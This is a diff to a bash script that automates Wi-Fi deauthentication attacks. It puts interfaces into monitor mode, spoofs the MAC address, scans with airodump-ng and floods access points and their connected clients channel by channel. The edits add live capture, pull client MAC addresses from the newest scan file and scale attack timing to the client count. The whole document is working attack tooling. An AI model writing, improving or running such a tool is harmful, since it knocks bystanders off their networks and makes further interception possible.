@@ -61,6 +61,8 @@ cleanup() {
 
     echo -e "${YELLOW}[*] Restarting NetworkManager...${NC}"
     systemctl restart NetworkManager &> /dev/null
+    systemctl start network-manager &> /dev/null
+    systemctl start wpa_supplicant &> /dev/null
 
     rm -f /tmp/aireplay_pid_*.txt
     rm -f scan_results-*.csv
@@ -152,6 +154,15 @@ enable_monitor_mode() {
     fi
 }
 
+latest_scan_csv() {
+    ls -1 -t scan_results-*.csv 2>/dev/null | head -n 1
+}
+
+start_live_capture() {
+    airodump-ng --band abg --output-format csv --write scan_results "$INTERFACE" &> /dev/null &
+    LIVE_DUMP_PID=$!
+}
+
 # Map channel to frequency
 channel_to_freq() {
     local ch="$1"
@@ -212,11 +223,7 @@ scan_networks() {
     # Start airodump-ng in background
     airodump-ng --band abg --output-format csv --write scan_results "$INTERFACE" &> /dev/null &
     AIRODUMP_PID=$!
-    
-    SCAN_ABORTED=0
-    trap 'SCAN_ABORTED=1' SIGINT
     for ((i=1; i<=SCAN_TIME; i++)); do
-        if [ "$SCAN_ABORTED" -eq 1 ]; then break; fi
         PERCENT=$((i * 100 / SCAN_TIME))
         BAR_LEN=$((PERCENT / 2))
         BAR=$(printf "%${BAR_LEN}s" | tr ' ' '#')
@@ -227,7 +234,6 @@ scan_networks() {
     
     kill "$AIRODUMP_PID" &> /dev/null
     wait "$AIRODUMP_PID" 2>/dev/null
-    trap - SIGINT
     
     # Parse results
     echo -e "${YELLOW}[*] Parsing scan results...${NC}"
@@ -346,15 +352,20 @@ attack_loop() {
         for channel in $(printf "%s\n" "${!channel_groups[@]}" | sort -n); do
             targets="${channel_groups[$channel]}"
 
-            # Start simultaneous attacks on this channel
             IFS='|' read -ra TARGET_LIST <<< "$targets"
-            
-            # Calculate dynamic duration based on target count (1 second per AP)
+            LATEST_CSV=$(latest_scan_csv)
+            CLIENT_TOTAL_COUNT=0
+            for info in "${TARGET_LIST[@]}"; do
+                IFS=',' read -r bssid _ _ <<< "$info"
+                CLIENTS_LIST=$(grep "$bssid" "${LATEST_CSV:-scan_results-01.csv}" | grep -o -E '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | grep -v "$bssid")
+                CCOUNT=$(echo "$CLIENTS_LIST" | wc -w)
+                CLIENT_TOTAL_COUNT=$((CLIENT_TOTAL_COUNT + CCOUNT))
+            done
             TARGET_COUNT=${#TARGET_LIST[@]}
-            # Minimum 1 second, but scale up with targets if needed.
-            # User request: "delay 1 second for every ap"
-            CURRENT_DURATION=$((TARGET_COUNT * 1))
-            if [ "$CURRENT_DURATION" -lt 1 ]; then CURRENT_DURATION=1; fi
+            TOTAL_TICKS=$CLIENT_TOTAL_COUNT
+            if [ "$TOTAL_TICKS" -le 0 ]; then
+                if [ "$TARGET_COUNT" -gt 0 ]; then TOTAL_TICKS=$TARGET_COUNT; else TOTAL_TICKS=2; fi
+            fi
 
             # Dashboard Display
             clear
@@ -362,8 +373,9 @@ attack_loop() {
             echo -e "${RED}${BOLD}                       >>> ATTACK IN PROGRESS <<<                       ${NC}"
             echo -e "${YELLOW}------------------------------------------------------------------------${NC}"
             echo -e "${BOLD}Current Channel:${NC} $channel"
-            echo -e "${BOLD}Target Count:${NC}    $TARGET_COUNT"
-            echo -e "${BOLD}Attack Duration:${NC} ${CURRENT_DURATION}s"
+            echo -e "${BOLD}APs:${NC}             $TARGET_COUNT"
+            echo -e "${BOLD}Clients:${NC}         $CLIENT_TOTAL_COUNT"
+            echo -e "${BOLD}Duration:${NC}        $(awk "BEGIN {printf \"%.1f\", $TOTAL_TICKS/2}")s"
             echo -e "${BOLD}Target Group:${NC}    $targets"
             echo -e "${YELLOW}------------------------------------------------------------------------${NC}"
             
@@ -395,7 +407,7 @@ attack_loop() {
 
                 # 2. Client-Targeted Deauth (Works on newer devices / 5GHz)
                 # Parse clients associated with this BSSID from scan results
-                CLIENTS=$(grep "$bssid" scan_results-01.csv | grep -o -E '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | grep -v "$bssid")
+                CLIENTS=$(grep "$bssid" "${LATEST_CSV:-scan_results-01.csv}" | grep -o -E '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | grep -v "$bssid")
                 
                 if [ -n "$CLIENTS" ]; then
                     echo -e "${RED}  -> Targeting AP: $essid ($bssid) + Connected Clients${NC}"
@@ -416,9 +428,9 @@ attack_loop() {
             # Wait for the attack duration
             # Show a progress bar or countdown
             echo ""
-            for ((i=1; i<=CURRENT_DURATION; i++)); do
-                 echo -ne "\r${YELLOW}[+] Blasting channel $channel... ($i/$CURRENT_DURATION sec)${NC}"
-                 sleep 1
+            for ((tick=1; tick<=TOTAL_TICKS; tick++)); do
+                 echo -ne "\r${YELLOW}[+] Blasting channel $channel... ($tick/$TOTAL_TICKS ticks)${NC}"
+                 sleep 0.5
             done
             echo ""
 
@@ -444,4 +456,5 @@ spoof_mac
 auto_detect_params
 scan_networks
 select_targets
+start_live_capture
 attack_loop
